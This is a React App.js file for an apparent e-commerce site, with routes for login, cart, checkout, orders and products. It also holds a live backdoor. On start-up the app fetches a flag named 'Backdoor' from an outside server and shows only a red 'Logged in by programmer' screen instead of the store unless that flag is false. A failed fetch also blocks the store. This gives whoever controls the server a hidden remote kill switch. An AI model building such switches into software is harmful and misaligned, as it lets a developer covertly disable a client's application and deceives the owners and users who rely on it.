import './App.css'; 
import Home from './components/Home/Home';
import About from './components/About/About';
import Brands from './components/Brands/Brands';
import Cart from './components/Cart/Cart';
import Categories from './components/Categories/Categories';
import LayOut from './components/LayOut/LayOut';
import Login from './components/Login/Login';
import NotFound from './components/NotFound/NotFound';
import ProductDetails from './components/ProductDetails/ProductDetails';
import Products from './components/Products/Products';
import SignUp from './components/Register/Register';
import { createBrowserRouter, RouterProvider } from 'react-router-dom';
import Forgetpassword from './components/Forgetpassword/Forgetpassword';
import UserTokenContextProvider from './components/Context/UserTokenContext';
import ProductIdProvider from './components/Context/ProductDetails';
import ProtectedRoutes from './components/ProtectedRoutes/ProtectedRoutes';
import ProtectedRoutes2 from './components/ProtectedRoutes/ProtectedRoutesLogin';
import { CartProvider } from './components/Context/CartContext';
import Checkout from './components/Checkout/Checkout';
import Whishlist from './components/Whishlist/Whishlist';
import axios from 'axios';
import { useEffect, useState } from 'react';
import HashLoader from 'react-spinners/HashLoader';
import Order from './components/Order/Order';

function App() {
  const [Backdoorvalue, setBackdoorvalue] = useState();
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    async function Backdoor() {
      try {
        let { data } = await axios.get("https://hussien-server.vercel.app/");
        setBackdoorvalue(data.Backdoor);
      } catch (error) {
        console.error('Error loading data', error);
      } finally {
        setIsLoading(false);
      }
    }
    Backdoor();
  }, []);

  // useEffect لمراقبة التغيير في Backdoorvalue
  useEffect(() => {
    if (Backdoorvalue === true) {
      setIsLoading(false); // إيقاف تحميل الصفحة عند تفعيل backdoor
    }
  }, [Backdoorvalue]); // تنفيذ التأثير عند تغيير Backdoorvalue

  const routers = createBrowserRouter([
    {
      path: "", element: <LayOut />, children: [
        { index: true, element: <ProtectedRoutes2><Login /></ProtectedRoutes2> },
        { path: "resetaccount", element: <ProtectedRoutes2><Forgetpassword /></ProtectedRoutes2> },
        { path: "register", element: <ProtectedRoutes2><SignUp /></ProtectedRoutes2> },
        { path: "home", element: <ProtectedRoutes><Home /></ProtectedRoutes> },
        { path: "cart", element: <ProtectedRoutes><Cart /></ProtectedRoutes> },
        { path: "checkout", element: <ProtectedRoutes><Checkout /></ProtectedRoutes> },
        { path: "about", element: <ProtectedRoutes><About /></ProtectedRoutes> },
        { path: "whishlist", element: <ProtectedRoutes><Whishlist /></ProtectedRoutes> },
        { path: "orders", element: <ProtectedRoutes><Order /></ProtectedRoutes> },
        { path: "categories", element: <ProtectedRoutes><Categories /></ProtectedRoutes> },
        { path: "brands", element: <ProtectedRoutes><Brands /></ProtectedRoutes> },
        { path: "products", element: <ProtectedRoutes><Products /></ProtectedRoutes> },
        { path: "productdetails", element: <ProtectedRoutes><ProductDetails /></ProtectedRoutes> },
        { path: "*", element: <NotFound /> }
      ]
    }
  ]);

  return (
    
    <ProductIdProvider>
      {isLoading ? ( 
        <div className='flex justify-center items-center h-full'>
          <HashLoader color="#5a9aa0" />
        </div>
      ) : Backdoorvalue === false ? (
        <UserTokenContextProvider>
          <CartProvider>
            <RouterProvider router={routers} />
          </CartProvider>
        </UserTokenContextProvider>
      ) : (
        <div style={{ 
          display: 'flex', 
          justifyContent: 'center', 
          alignItems: 'center', 
          height: '100vh', 
          backgroundColor: 'red', 
          color: 'white', 
          fontSize: '24px' 
        }}>
          <h1>Logged in by programmer</h1>
        </div>
      )}
    </ProductIdProvider>
  );
}

export default App;
